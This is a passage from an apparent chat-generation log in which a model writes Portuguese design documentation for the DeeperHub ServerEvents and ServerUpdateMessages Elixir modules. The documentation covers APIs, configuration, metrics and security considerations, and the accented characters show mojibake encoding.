*   O agendamento (data/hora de in√≠cio e fim) dos eventos.
*   A listagem de eventos ativos, futuros e passados para um servidor ou globalmente.
*   Notifica√ß√£o aos jogadores interessados sobre eventos futuros ou em andamento.

O objetivo √© fornecer uma ferramenta para que os servidores engajem suas comunidades e informem os jogadores sobre atividades importantes. üòä

*(Nota: Na documenta√ß√£o original, este era `DeeperHub.Services.ServerEvents`. Ser√° tratado como `DeeperHub.ServerEvents`.)*

## üéØ 2. Responsabilidades e Funcionalidades Chave

*   **Gerenciamento CRUD de Eventos (`create_event/1`, `get_event/1`, `update_event/2`, `delete_event/1`):**
    *   Permitir que propriet√°rios de servidores (ou administradores) criem novos eventos associados a seus servidores.
    *   Cada evento inclui: t√≠tulo, descri√ß√£o, tipo de evento (ex: `:maintenance`, `:tournament`, `:special_offer`, `:content_update`), data/hora de in√≠cio, data/hora de fim, imagem/banner opcional, URL para mais informa√ß√µes (opcional).
    *   Atualizar ou excluir eventos agendados.
*   **Listagem de Eventos:**
    *   Listar todos os eventos para um servidor espec√≠fico (`list_events_by_server/2`).
    *   Listar eventos ativos no momento (`list_current_events/2`).
    *   Listar eventos futuros/pr√≥ximos (`list_upcoming_events/1`).
    *   Listar eventos passados.
    *   Suportar filtros (por tipo, por servidor) e pagina√ß√£o.
*   **Status do Evento:**
    *   Determinar automaticamente o status de um evento (ex: `:scheduled`, `:active`, `:completed`, `:cancelled`) com base nas datas/horas.
*   **Notifica√ß√µes (Integra√ß√£o com `DeeperHub.Notifications` e `DeeperHub.UserInteractions` se houver \"seguir servidor\"):**
    *   Notificar usu√°rios que seguem um servidor (ou que optaram por receber notifica√ß√µes de eventos) sobre:
        *   Novos eventos agendados.
        *   Eventos que est√£o prestes a come√ßar.
        *   In√≠cio de eventos.
        *   Altera√ß√µes ou cancelamentos de eventos.
*   **Calend√°rio de Eventos (Visualiza√ß√£o):**
    *   Fornecer dados para a constru√ß√£o de uma visualiza√ß√£o de calend√°rio de eventos (global ou por servidor).
*   **Observabilidade e Auditoria:**
    *   Logar e metrificar a cria√ß√£o e o ciclo de vida dos eventos.
    *   Publicar eventos de dom√≠nio (ex: `server_event.created`, `server_event.started`) no `Core.EventBus`.
    *   Auditar a cria√ß√£o/modifica√ß√£o de eventos.
*   **Caching:**
    *   Cachear listas de eventos ativos ou futuros para performance.

## üèóÔ∏è 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.ServerEvents` (Fachada P√∫blica):**
    *   Ponto de entrada para opera√ß√µes de eventos de servidor.
    *   Delega para o `ServerEventsService`.
2.  **`DeeperHub.ServerEvents.Services.ServerEventsService` (ou `DefaultServerEventsService`):**
    *   **Responsabilidade:** Orquestra a l√≥gica de neg√≥cio para eventos de servidor.
    *   **Intera√ß√µes:**
        *   `DeeperHub.Core.Repo`: Para CRUD com `EventSchema`.
        *   `DeeperHub.Servers`: Para validar `server_id` e associar eventos.
        *   `DeeperHub.Accounts`: Para `user_id` do criador do evento (propriet√°rio do servidor).
        *   `DeeperHub.Auth`/`RBAC`: Para permiss√µes de gerenciamento de eventos.
        *   `DeeperHub.Core.EventBus`: Para publicar eventos de ciclo de vida de `ServerEvent`.
        *   `DeeperHub.Core.Cache`: Para cachear listas de eventos.
        *   `DeeperHub.Notifications`: Para enviar notifica√ß√µes sobre eventos.
        *   `DeeperHub.Core.ConfigManager`.
3.  **`DeeperHub.ServerEvents.Schemas.EventSchema` (ex-`Event`):**
    *   Campos: `id`, `server_id`, `created_by_user_id`, `title`, `description`, `event_type` (atom), `start_time` (NaiveDateTime ou DateTime UTC), `end_time` (NaiveDateTime ou DateTime UTC), `image_url` (opcional), `details_url` (opcional), `status` (calculado ou armazenado, ex: `:scheduled`, `:active`, `:completed`), `is_public`, `inserted_at`, `updated_at`.
4.  **`DeeperHub.ServerEvents.Storage` (ou l√≥gica no `ServerEventsService`):**
    *   Encapsula as queries Ecto.
5.  **Workers (Opcional):**
    *   `EventStatusUpdateWorker`: Para atualizar periodicamente o status de eventos (ex: de `:scheduled` para `:active`, de `:active` para `:completed`).
    *   `EventNotificationWorker`: Para enviar notifica√ß√µes agendadas sobre eventos (ex: lembretes).

### 3.2. Estrutura de Diret√≥rios (Proposta)

```
lib/deeper_hub/server_events/
‚îú‚îÄ‚îÄ server_events.ex                  # Fachada P√∫blica
‚îÇ
‚îú‚îÄ‚îÄ services/
‚îÇ   ‚îî‚îÄ‚îÄ server_events_service.ex      # Servi√ßo principal
‚îÇ
‚îú‚îÄ‚îÄ schemas/
‚îÇ   ‚îî‚îÄ‚îÄ event_schema.ex
‚îÇ
‚îú‚îÄ‚îÄ storage.ex                        # (Opcional)
‚îÇ
‚îú‚îÄ‚îÄ workers/                          # Opcional
‚îÇ   ‚îú‚îÄ‚îÄ event_status_update_worker.ex
‚îÇ   ‚îî‚îÄ‚îÄ event_notification_worker.ex
‚îÇ
‚îú‚îÄ‚îÄ cached_adapter.ex                 # (Opcional, da documenta√ß√£o original)
‚îú‚îÄ‚îÄ supervisor.ex
‚îî‚îÄ‚îÄ telemetry.ex
```

### 3.3. Decis√µes de Design Importantes

*   **Datas e Fusos Hor√°rios:** Usar `DateTime` com UTC para `start_time` e `end_time` √© crucial se os eventos s√£o globais ou se os usu√°rios est√£o em diferentes fusos hor√°rios. Se os eventos s√£o sempre no \"hor√°rio do servidor\" e o fuso do servidor √© conhecido, `NaiveDateTime` pode ser usado, mas a convers√£o para exibi√ß√£o ao usu√°rio ainda √© necess√°ria.
*   **Status do Evento:** Pode ser um campo persistido atualizado por um worker ou calculado dinamicamente nas queries e na l√≥gica de servi√ßo com base nas datas/horas atuais. C√°lculo din√¢mico √© mais simples, mas menos eficiente para queries de status.
*   **Notifica√ß√µes:** A l√≥gica de quem √© notificado (ex: seguidores do servidor, todos os jogadores, etc.) e quando (X horas antes, no in√≠cio) precisa ser bem definida.

## üõ†Ô∏è 4. Casos de Uso Principais

*   **Propriet√°rio de Servidor Agenda uma Manuten√ß√£o:**
    *   Na UI, define t√≠tulo \"Manuten√ß√£o Semanal\", descri√ß√£o, tipo `:maintenance`, `start_time` e `end_time`.
    *   API chama `ServerEvents.create_event(user_id, server_id, event_attrs)`.
    *   O evento √© salvo com status `:scheduled`.
    *   Usu√°rios que seguem o servidor s√£o notificados (ex: \"Manuten√ß√£o agendada para [data]\").
*   **Jogador Verifica Eventos Ativos em um Servidor:**
    *   Na p√°gina do servidor, UI chama API que leva a `ServerEvents.list_current_events(server_id)`.
*   **Sistema Inicia um Evento Agendado:**
    *   `EventStatusUpdateWorker` roda.
    *   Encontra eventos cujo `start_time` passou e o status ainda √© `:scheduled`.
    *   Atualiza o status para `:active`.
    *   Publica evento `server_event.started` no `Core.EventBus`.
    *   (Opcional) Envia notifica√ß√µes \"Evento X come√ßou!\".

## üåä 5. Fluxos Importantes

### Fluxo de Cria√ß√£o e Notifica√ß√£o de Novo Evento

1.  **Propriet√°rio (UI):** Submete formul√°rio de novo evento.
2.  **Controller API:** Valida autentica√ß√£o e autoriza√ß√£o (se o usu√°rio √© propriet√°rio do servidor). Chama `DeeperHub.ServerEvents.create_event(current_user.id, server_id, params[\"event\"])`.
3.  **`ServerEventsService.create_event/3`:**
    *   Valida os `attrs` (datas, tipo, etc.).
    *   Cria um `EventSchema` changeset.
    *   Se v√°lido, `Core.Repo.insert(changeset)`.
    *   Se sucesso:
        *   Publica evento `server_event.created` no `Core.EventBus` (`%{event_id: new_event.id, server_id: ..., details: ...}`).
        *   (Ass√≠ncrono) Enfileira uma tarefa para `EventNotificationWorker` ou chama diretamente `DeeperHub.Notifications` para notificar usu√°rios relevantes (ex: seguidores do `server_id`) sobre o novo evento agendado.
        *   Retorna `{:ok, event_struct}`.
    *   Se falha, retorna erro.

## üì° 6. API (Fun√ß√µes P√∫blicas da Fachada `DeeperHub.ServerEvents`)

### 6.1. Gerenciamento de Eventos (Propriet√°rio/Admin)

*   **`DeeperHub.ServerEvents.create_event(creator_user_id :: String.t(), server_id :: String.t(), attrs :: map()) :: {:ok, Event.t()} | {:error, Ecto.Changeset.t()}`**
    *   `attrs`: `%{title: String.t(), description: String.t(), event_type: atom(), start_time: DateTime.t(), end_time: DateTime.t(), image_url: String.t() | nil}`.
*   **`DeeperHub.ServerEvents.update_event(event_id :: String.t(), attrs :: map(), current_user_id :: String.t()) :: {:ok, Event.t()} | {:error, Ecto.Changeset.t() | :unauthorized}`**
*   **`DeeperHub.ServerEvents.delete_event(event_id :: String.t(), current_user_id :: String.t()) :: :ok | {:error, :unauthorized | :not_found}`**
*   **`DeeperHub.ServerEvents.cancel_event(event_id :: String.t(), reason :: String.t() | nil, current_user_id :: String.t()) :: {:ok, Event.t()} | {:error, term()}` (Nova Sugest√£o)**
    *   Muda o status para `:cancelled` e notifica.

### 6.2. Consulta de Eventos

*   **`DeeperHub.ServerEvents.get_event(event_id :: String.t()) :: {:ok, Event.t() | nil}`**
*   **`DeeperHub.ServerEvents.list_events_by_server(server_id :: String.t(), opts :: keyword()) :: {:ok, list(Event.t()), Pagination.t()}`**
    *   `opts`: `:status` (`:scheduled`, `:active`, `:completed`, `:cancelled`), `:type`, `:date_range` (`%{start_after: DateTime.t(), end_before: DateTime.t()}`), `:page`, `:per_page`, `:sort_by`.
*   **`DeeperHub.ServerEvents.list_active_events(filters :: map() | nil, opts :: keyword()) :: {:ok, list(Event.t()), Pagination.t()}`**
    *   `filters`: `:server_id`, `:type`. Lista eventos que est√£o atualmente acontecendo.
*   **`DeeperHub.ServerEvents.list_upcoming_events(filters :: map() | nil, opts :: keyword()) :: {:ok, list(Event.t()), Pagination.t()}`**
    *   `filters`: `:server_id`, `:type`. Lista eventos agendados para o futuro.
*   **`DeeperHub.ServerEvents.get_global_event_calendar(date_range :: map(), filters :: map() | nil) :: {:ok, list(CalendarEvent.t())}` (Nova Sugest√£o)**
    *   `CalendarEvent.t()`: `%{id: ..., title: ..., start: DateTime.t(), end: DateTime.t(), server_name: ..., color_by_type: ...}`. Para alimentar uma UI de calend√°rio.

## ‚öôÔ∏è 7. Configura√ß√£o

Via `DeeperHub.Core.ConfigManager`:

*   **`[:server_events, :enabled]`** (Boolean).
*   **`[:server_events, :max_event_duration_hours]`** (Integer). (Padr√£o: `7 * 24` - 1 semana)
*   **`[:server_events, :default_event_types]`** (List de Atoms ou Maps com descri√ß√µes): Tipos de evento pr√©-definidos.
*   **`[:server_events, :notification, :notify_before_start_minutes]`** (List de Integers): Quando enviar lembretes (ex: `[60, 15]` - 1 hora e 15 mins antes).
*   **`[:server_events, :cache, :active_events_ttl_seconds]`** (Integer).
*   **`[:server_events, :worker, :status_update_interval_minutes]`** (Integer).

## üîó 8. Depend√™ncias

### 8.1. M√≥dulos Internos

*   `DeeperHub.Core.*`.
*   `DeeperHub.Servers`: Para `server_id`.
*   `DeeperHub.Accounts`: Para `user_id`.
*   `DeeperHub.Auth`/`RBAC`: Para permiss√µes.
*   `DeeperHub.Notifications`: Para enviar notifica√ß√µes/lembretes.
*   `DeeperHub.UserInteractions` (opcional): Se houver um sistema de \"seguir servidor\" para determinar quem notificar.

### 8.2. Bibliotecas Externas

*   `Ecto`.
*   Biblioteca CRON para workers (ex: `Quantum`).

## ü§ù 9. Como Usar / Integra√ß√£o

*   **UI do Propriet√°rio do Servidor:** Formul√°rios para criar/editar eventos.
*   **UI do Jogador (P√°gina do Servidor/Calend√°rio Global):** Exibir listas de eventos (`list_events_by_server`, `list_active_events`, `list_upcoming_events`, `get_global_event_calendar`).
*   **`EventStatusUpdateWorker` e `EventNotificationWorker`:** Operam em background para gerenciar o ciclo de vida e notifica√ß√µes.

## ‚úÖ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar CRUD de `EventSchema`.
*   Testar a l√≥gica de determina√ß√£o de status do evento (scheduled, active, completed) com base nas datas.
*   Testar as fun√ß√µes de listagem com diferentes filtros e ordena√ß√µes.
*   Testar a l√≥gica de notifica√ß√£o (com mocks para `DeeperHub.Notifications`).
*   Testar os workers.
*   Localiza√ß√£o: `test/deeper_hub/server_events/`.

### 10.2. M√©tricas

*   `deeper_hub.server_events.created.count` (tags: `server_id`, `event_type`)
*   `deeper_hub.server_events.status_changed.count` (tags: `event_id`, `new_status`)
*   `deeper_hub.server_events.active_now.gauge` (Gauge, tags: `server_id` (opcional), `event_type`)
*   `deeper_hub.server_events.notifications_sent.count` (tags: `event_id`, `notification_trigger` (`new`, `reminder`, `started`))

### 10.3. Logs

*   **N√≠vel INFO:** Evento criado, iniciado, conclu√≠do, cancelado. Notifica√ß√£o de evento enviada.
*   **N√≠vel WARNING:** Tentativa n√£o autorizada de gerenciar um evento.
*   **N√≠vel ERROR:** Falha ao persistir evento. Erro no worker de atualiza√ß√£o de status.

### 10.4. Telemetria

*   `[:deeper_hub, :server_events, :event, :created | :updated | :deleted | :cancelled]`
    *   Metadados: `%{event_id: id, server_id: id, user_id: id, type: type}`
*   `[:deeper_hub, :server_events, :event, :status_transition]`
    *   Metadados: `%{event_id: id, old_status: atom, new_status: atom}`
*   `[:deeper_hub, :server_events, :notification, :dispatch_attempt]`
    *   Metadados: `%{event_id: id, notification_type: type, recipient_count: count}`

## ‚ùå 11. Tratamento de Erros

*   Falhas na cria√ß√£o/atualiza√ß√£o de eventos devido a dados inv√°lidos retornam `{:error, changeset}`.
*   Opera√ß√µes n√£o autorizadas retornam `{:error, :unauthorized}`.
*   Se um worker de notifica√ß√£o falhar, a notifica√ß√£o pode ser perdida ou reenfileirada, mas o evento em si deve permanecer consistente.

## üõ°Ô∏è 12. Considera√ß√µes de Seguran√ßa

*   **Autoriza√ß√£o:** Apenas propriet√°rios de servidores ou administradores com permiss√£o devem poder criar/gerenciar eventos para um servidor.
*   **Valida√ß√£o de Conte√∫do:** T√≠tulos e descri√ß√µes de eventos devem ser validados/sanitizados para prevenir XSS se forem exibidos diretamente.
*   **Abuso:** Limitar a frequ√™ncia com que um propriet√°rio pode criar eventos ou o n√∫mero de eventos ativos por servidor para evitar spam.

## üßë‚Äçüíª 13. Contribui√ß√£o

*   Ao adicionar novos tipos de eventos, certifique-se de que a l√≥gica de notifica√ß√£o e, possivelmente, os templates sejam atualizados.
*   Considere a performance das queries de listagem de eventos, especialmente para calend√°rios globais.

## üîÆ 14. Melhorias Futuras e TODOs

*   [ ] Permitir que usu√°rios se inscrevam (\"RSVP\") para eventos espec√≠ficos e recebam lembretes mais personalizados.
*   [ ] Integra√ß√£o com calend√°rios externos (Google Calendar, iCal).
*   [ ] Suporte para eventos recorrentes (ex: \"Toda sexta-feira √†s 20h\").
*   [ ] Permitir que propriet√°rios de servidores \"destaquem\" certos eventos.
*   [ ] Adicionar um feed de \"Pr√≥ximos Eventos\" na dashboard do usu√°rio para os servidores que ele segue/favorita.
*   [ ] L√≥gica para sugerir hor√°rios para eventos baseados na atividade dos jogadores do servidor.

---

*√öltima atualiza√ß√£o: 2025-05-12*

---

Eventos de servidor s√£o uma √≥tima forma de manter a comunidade engajada!

Pr√≥ximo? Que tal `DeeperHub.ServerUpdateMessages` para mensagens de patch notes e atualiza√ß√µes, ou `DeeperHub.ServerPackages` para itens/VIPs? Ou algo do Core que ainda n√£o detalhamos, como `DeeperHub.Core.EncryptionService` de forma mais aprofundada?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Ok, vamos continuar com os m√≥dulos relacionados a `Servers` e detalhar o `DeeperHub.ServerUpdateMessages`. Este m√≥dulo permite que propriet√°rios de servidores comuniquem atualiza√ß√µes e novidades para sua comunidade.

---

# M√≥dulo: `DeeperHub.ServerUpdateMessages` üöÄ

## üìú 1. Vis√£o Geral do M√≥dulo `DeeperHub.ServerUpdateMessages`

O m√≥dulo `DeeperHub.ServerUpdateMessages` gerencia as **mensagens de atualiza√ß√£o, notas de patch e an√∫ncios importantes** publicados pelos propriet√°rios de servidores na plataforma DeeperHub. Ele serve como um canal de comunica√ß√£o oficial do servidor para sua comunidade, permitindo informar sobre novas funcionalidades, corre√ß√µes de bugs, mudan√ßas no jogo, ou qualquer outra not√≠cia relevante.

Este m√≥dulo lida com:
*   A cria√ß√£o, edi√ß√£o e exclus√£o de mensagens de atualiza√ß√£o por propriet√°rios de servidores.
*   A listagem cronol√≥gica dessas mensagens para um servidor espec√≠fico.
*   A notifica√ß√£o de jogadores (especialmente aqueles que seguem o servidor) sobre novas mensagens de atualiza√ß√£o.

O objetivo √© manter os jogadores informados sobre o desenvolvimento e as novidades de seus servidores favoritos. üòä

*(Nota: Na documenta√ß√£o original, este era `DeeperHub.Services.ServerUpdateMessages`. Ser√° tratado como `DeeperHub.ServerUpdateMessages`.)*

## üéØ 2. Responsabilidades e Funcionalidades Chave

*   **Gerenciamento CRUD de Mensagens de Atualiza√ß√£o (`create_update_message/1`, `get_update_message/1`, `update_update_message/2`, `delete_update_message/1`):**
    *   Permitir que propriet√°rios de servidores (ou administradores com permiss√£o) criem novas mensagens de atualiza√ß√£o.
    *   Cada mensagem inclui: t√≠tulo, conte√∫do (corpo da mensagem, que pode suportar markdown ou HTML limitado e sanitizado), vers√£o do servidor (opcional), data de publica√ß√£o.
    *   Permitir a edi√ß√£o ou exclus√£o de mensagens publicadas (com restri√ß√µes ou hist√≥rico de vers√µes, opcional).
*   **Listagem de Mensagens de Atualiza√ß√£o:**
    *   Listar todas as mensagens de atualiza√ß√£o para um servidor espec√≠fico, geralmente em ordem cronol√≥gica inversa (`list_update_messages_by_server/2`).
    *   Obter a √∫ltima mensagem de atualiza√ß√£o de um servidor (`get_latest_update_message/2`).
    *   Suportar pagina√ß√£o para o hist√≥rico de mensagens.
*   **Formata√ß√£o de Conte√∫do:**
    *   Suportar Markdown ou um subconjunto seguro de HTML para o corpo da mensagem, com sanitiza√ß√£o rigorosa (via `DeeperHub.Security.XssProtection` e `Shared.ContentValidation`).
*   **Notifica√ß√µes (Integra√ß√£o com `DeeperHub.Notifications` e `UserInteractions`):**
    *   Notificar usu√°rios que seguem um servidor (ou que optaram por receber essas notifica√ß√µes) quando uma nova mensagem de atualiza√ß√£o √© publicada.
*   **Visibilidade e Publica√ß√£o:**
    *   Permitir que mensagens sejam salvas como rascunho antes de serem publicadas.
    *   Controle sobre a data de publica√ß√£o.
*   **Observabilidade e Auditoria:**
    *   Logar e metrificar a cria√ß√£o e visualiza√ß√£o de mensagens de atualiza√ß√£o.
    *   Publicar eventos de dom√≠nio (ex: `server_update_message.published`) no `Core.EventBus`.
    *   Auditar a cria√ß√£o/modifica√ß√£o de mensagens.
*   **Caching:**
    *   Cachear as √∫ltimas mensagens de atualiza√ß√£o de servidores populares ou frequentemente acessados.

## üèóÔ∏è 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.ServerUpdateMessages` (Fachada P√∫blica):**
    *   Ponto de entrada para todas as opera√ß√µes relacionadas a mensagens de atualiza√ß√£o.
    *   Delega para o `ServerUpdateMessagesService`.
2.  **`DeeperHub.ServerUpdateMessages.Services.ServerUpdateMessagesService` (ou `DefaultServerUpdateMessagesService`):**
    *   **Responsabilidade:** Orquestra a l√≥gica de neg√≥cio para as mensagens de atualiza√ß√£o.
    *   **Intera√ß√µes:**
        *   `DeeperHub.Core.Repo`: Para CRUD com `UpdateMessageSchema`.
        *   `DeeperHub.Servers`: Para validar `server_id` e associar mensagens.
        *   `DeeperHub.Accounts`: Para `user_id` do autor (propriet√°rio/admin).
        *   `DeeperHub.Auth`/`RBAC`: Para permiss√µes de gerenciamento de mensagens.
        *   `DeeperHub.Security.XssProtection` / `Shared.ContentValidation`: Para sanitizar o conte√∫do das mensagens.
        *   `DeeperHub.Core.EventBus`: Para publicar eventos.
        *   `DeeperHub.Core.Cache`: Para cachear mensagens.
        *   `DeeperHub.Notifications`: Para enviar notifica√ß√µes sobre novas mensagens.
3.  **`DeeperHub.ServerUpdateMessages.Schemas.UpdateMessageSchema` (ex-`UpdateMessage`):**
    *   Campos: `id`, `server_id`, `author_user_id`, `title` (string), `content` (text, armazena o markdown/html sanitizado), `published_at` (DateTime UTC), `version_tag` (string, opcional, ex: \"v1.2.3\"), `status` (`:draft`, `:published`, `:archived`), `inserted_at`, `updated_at`.
4.  **`DeeperHub.ServerUpdateMessages.Storage` (ou l√≥gica no `ServerUpdateMessagesService`):**
    *   Encapsula as queries Ecto.
5.  **`DeeperHub.ServerUpdateMessages.CachedAdapter` (Opcional):**
    *   Camada de cache expl√≠cita.

### 3.2. Estrutura de Diret√≥rios (Proposta)

```
lib/deeper_hub/server_update_messages/
‚îú‚îÄ‚îÄ server_update_messages.ex         # Fachada P√∫blica
‚îÇ
‚îú‚îÄ‚îÄ services/
‚îÇ   ‚îî‚îÄ‚îÄ server_update_messages_service.ex # Servi√ßo principal
‚îÇ
‚îú‚îÄ‚îÄ schemas/
‚îÇ   ‚îî‚îÄ‚îÄ update_message_schema.ex
‚îÇ
‚îú‚îÄ‚îÄ storage.ex                        # (Opcional)
‚îú‚îÄ‚îÄ cached_adapter.ex                 # (Opcional)
‚îú‚îÄ‚îÄ supervisor.ex                     # (Se houver GenServers)
‚îî‚îÄ‚îÄ telemetry.ex
```

### 3.3. Decis√µes de Design Importantes

*   **Formato do Conte√∫do:** Decidir sobre o formato do conte√∫do (Markdown √© uma boa escolha por ser seguro e flex√≠vel) e implementar a sanitiza√ß√£o e renderiza√ß√£o apropriadas.
*   **Hist√≥rico de Edi√ß√µes:** Para mensagens importantes, considerar manter um hist√≥rico de edi√ß√µes.
*   **Fluxo de Publica√ß√£o:** Ter um status `:draft` permite que os propriet√°rios preparem as mensagens antes de torn√°-las p√∫blicas.

## üõ†Ô∏è 4. Casos de Uso Principais

*   **Propriet√°rio de Servidor Escreve Notas de Patch:**
    *   No painel do servidor, propriet√°rio cria uma nova mensagem de atualiza√ß√£o, detalhando as mudan√ßas da vers√£o \"v1.5.2\".
    *   Define o status como `:draft` inicialmente.
    *   Ap√≥s revisar, publica a mensagem. API chama `ServerUpdateMessages.create_update_message(user_id, server_id, %{title: \"Patch v1.5.2\", content: \"...\", version_tag: \"v1.5.2\", status: :published})`.
    *   Usu√°rios que seguem o servidor s√£o notificados.
*   **Jogador Visualiza as √öltimas Atualiza√ß√µes de um Servidor:**
    *   Na p√°gina do servidor, a UI busca e exibe as √∫ltimas mensagens via `ServerUpdateMessages.list_update_messages_by_server(server_id, %{limit: 5})`.
*   **Propriet√°rio Edita uma Mensagem Publicada para Corrigir um Erro de Digita√ß√£o:**
    *   API chama `ServerUpdateMessages.update_update_message(message_id, %{content: \"Conte√∫do corrigido\"}, user_id)`.

## üåä 5. Fluxos Importantes

### Fluxo de Publica√ß√£o de Nova Mensagem de Atualiza√ß√£o

1.  **Propriet√°rio (UI):** Submete o formul√°rio da nova mensagem de atualiza√ß√£o, marcando para \"Publicar Agora\".
2.  **Controller API:** Valida autentica√ß√£o e autoriza√ß√£o. Chama `DeeperHub.ServerUpdateMessages.create_update_message(current_user.id, server_id, params[\"message_attrs\"])`.
3.  **`ServerUpdateMessagesService.create_update_message/3`:**
    *   Valida se `current_user.id` pode postar no `server_id`.
    *   Chama `DeeperHub.Services.Shared.ContentValidation.validate_user_content(attrs.content, :update_message_content)` para sanitizar o corpo da mensagem.
    *   Cria um `UpdateMessageSchema` changeset com `status: :published` e `published_at: DateTime.utc_now()`.
    *   Se v√°lido, `Core.Repo.insert(changeset)`.
    *   Se sucesso:
        *   Publica evento `server_update_message.published` no `Core.EventBus` (`%{message_id: msg.id, server_id: ..., title: ...}`).
        *   (Ass√≠ncrono) Enfileira notifica√ß√µes para seguidores do servidor via `DeeperHub.Notifications`.
        *   Invalida caches relevantes.
        *   Retorna `{:ok, message_struct}`.
    *   Se falha, retorna erro.

## üì° 6. API (Fun√ß√µes P√∫blicas da Fachada `DeeperHub.ServerUpdateMessages`)

### 6.1. Gerenciamento de Mensagens (Propriet√°rio/Admin)

*   **`DeeperHub.ServerUpdateMessages.create_update_message(author_user_id :: String.t(), server_id :: String.t(), attrs :: map()) :: {:ok, UpdateMessage.t()} | {:error, Ecto.Changeset.t()}`**
    *   `attrs`: `%{title: String.t(), content: String.t(), version_tag: String.t() | nil, status: :draft | :published, publish_at: DateTime.t() | nil}`.
*   **`DeeperHub.ServerUpdateMessages.update_update_message(message_id :: String.t(), attrs :: map(), current_user_id :: String.t()) :: {:ok, UpdateMessage.t()} | {:error, Ecto.Changeset.t() | :unauthorized}`**
*   **`DeeperHub.ServerUpdateMessages.delete_update_message(message_id :: String.t(), current_user_id :: String.t()) :: :ok | {:error, :unauthorized | :not_found}`**

### 6.2. Consulta de Mensagens

*   **`DeeperHub.ServerUpdateMessages.get_update_message(message_id :: String.t()) :: {:ok, UpdateMessage.t() | nil}`**
*   **`DeeperHub.ServerUpdateMessages.list_update_messages_by_server(server_id :: String.t(), opts :: keyword()) :: {:ok, list(UpdateMessage.t()), Pagination.t()}`**
    *   `opts`: `:status` (`:published`, `:draft`), `:page`, `:per_page`, `:sort_by` (`:published_at_desc`, `:updated_at_desc`).
*   **`DeeperHub.ServerUpdateMessages.get_latest_update_message(server_id :: String.t(), opts :: keyword()) :: {:ok, UpdateMessage.t() | nil}`**
    *   Retorna a √∫ltima mensagem com status `:published`.

## ‚öôÔ∏è 7. Configura√ß√£o

Via `DeeperHub.Core.ConfigManager`:

*   **`[:server_update_messages, :enabled]`** (Boolean).
*   **`[:server_update_messages, :max_title_length]`** (Integer). (Padr√£o: `150`)
*   **`[:server_update_messages, :max_content_length]`** (Integer). (Padr√£o: `10000`)
*   **`[:server_update_messages, :content_format]`** (Atom): `:markdown` ou `:html_subset`. (Padr√£o: `:markdown`)
*   **`[:server_update_messages, :notify_followers_on_publish]`** (Boolean). (Padr√£o: `true`)
*   **`[:server_update_messages, :cache, :latest_message_ttl_seconds]`** (Integer).
*   **`[:server_update_messages, :cache, :message_list_ttl_seconds]`** (Integer).

## üîó 8. Depend√™ncias

### 8.1. M√≥dulos Internos

*   `DeeperHub.Core.*`.
*   `DeeperHub.Servers`: Para `server_id`.
*   `DeeperHub.Accounts`: Para `author_user_id`.
*   `DeeperHub.Auth`/`RBAC`: Para permiss√µes.
*   `DeeperHub.Notifications`: Para notificar sobre novas mensagens.
*   `DeeperHub.Security.XssProtection` e `DeeperHub.Services.Shared.ContentValidation`: Para sanitizar conte√∫do.
*   `DeeperHub.UserInteractions` (especificamente a funcionalidade de \"seguir servidor\" para notifica√ß√µes).

### 8.2. Bibliotecas Externas

*   `Ecto`.
*   Uma biblioteca Markdown para Elixir (ex: `Earmark`) se o formato for Markdown.
*   Uma biblioteca de sanitiza√ß√£o HTML (ex: `HtmlSanitizeEx`) se HTML limitado for permitido.

## ü§ù 9. Como Usar / Integra√ß√£o

*   **UI do Propriet√°rio do Servidor:** Formul√°rios para criar/editar/publicar mensagens de atualiza√ß√£o.
*   **P√°gina do Servidor (UI do Jogador):** Se√ß√£o para exibir as √∫ltimas mensagens de atualiza√ß√£o (`list_update_messages_by_server` ou `get_latest_update_message`).
*   **Sistema de Notifica√ß√µes:** Notificar usu√°rios que seguem o servidor quando uma nova mensagem com status `:published` √© criada.

## ‚úÖ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar CRUD para `UpdateMessageSchema`.
*   Testar a l√≥gica de `status` (`:draft` vs `:published`).
*   Testar a sanitiza√ß√£o do conte√∫do da mensagem.
*   Testar a l√≥gica de notifica√ß√£o.
*   Testar a listagem e pagina√ß√£o.
*   Localiza√ß√£o: `test/deeper_hub/server_update_messages/`.

### 10.2. M√©tricas

*   `deeper_hub.server_update_messages.published.count` (tags: `server_id`)
*   `deeper_hub.server_update_messages.views.count` (tags: `message_id`, `server_id`) (Se o rastreamento de visualiza√ß√£o for implementado).
*   `deeper_hub.server_update_messages.content_sanitized.count`

### 10.3. Logs

*   **N√≠vel INFO:** Nova mensagem publicada/atualizada/exclu√≠da.
*   **N√≠vel WARNING:** Tentativa n√£o autorizada de gerenciar uma mensagem. Falha na sanitiza√ß√£o de conte√∫do (se cr√≠tico).

### 10.4. Telemetria

*   `[:deeper_hub, :server_update_messages, :message, :created | :updated | :deleted | :published]`
    *   Metadados: `%{message_id: id, server_id: id, author_id: id}`

## ‚ùå 11. Tratamento de Erros

*   Falhas de valida√ß√£o ao criar/atualizar retornam `{:error, changeset}`.
*   Opera√ß√µes n√£o autorizadas retornam `{:error, :unauthorized}`.

## üõ°Ô∏è 12. Considera√ß√µes de Seguran√ßa

*   **Sanitiza√ß√£o de Conte√∫do:** Absolutamente CRUCIAL para `title` e `content` para prevenir XSS e outras inje√ß√µes de HTML/script.
*   **Autoriza√ß√£o:** Apenas o propriet√°rio do servidor ou administradores com permiss√£o devem poder criar/gerenciar estas mensagens.
*   **Abuso:** Limitar a frequ√™ncia de postagem ou o tamanho das mensagens para evitar spam ou sobrecarga.

## üßë‚Äçüíª 13. Contribui√ß√£o

*   Garanta que a sanitiza√ß√£o de conte√∫do seja robusta.
*   Considere a experi√™ncia do usu√°rio ao exibir mensagens longas ou com formata√ß√£o complexa.

## üîÆ 14. Melhorias Futuras e TODOs

*   [ ] Permitir \"fixar\" mensagens importantes no topo.
*   [ ] Adicionar contagem de visualiza√ß√µes para mensagens.
*   [ ] Suporte para agendar a publica√ß√£o de mensagens (definir `published_at` no futuro e um worker para mudar o status).
*   [ ] Permitir coment√°rios de usu√°rios nas mensagens de atualiza√ß√£o (com modera√ß√£o).
*   [ ] Hist√≥rico de vers√µes para mensagens editadas.
*   [ ] Templates para tipos comuns de mensagens de atualiza√ß√£o.

---

*√öltima atualiza√ß√£o: 2025-05-12*

---

Este m√≥dulo ajuda os propriet√°rios de servidores a manterem suas comunidades informadas!

